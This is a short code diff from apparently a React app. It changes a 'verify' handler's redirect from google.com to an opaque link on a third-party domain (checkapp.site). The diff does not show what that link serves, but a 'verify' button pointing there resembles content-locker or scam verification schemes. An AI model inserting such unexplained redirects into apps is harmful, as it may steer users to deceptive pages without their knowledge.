@@ -201,7 +201,7 @@ export default function App() {
   };
 
   const handleVerify = () => {
-    window.location.href = 'https://google.com';
+    window.location.href = 'https://checkapp.site/cl/i/gr6n6r';
   };
 
   const resetModal = () => {
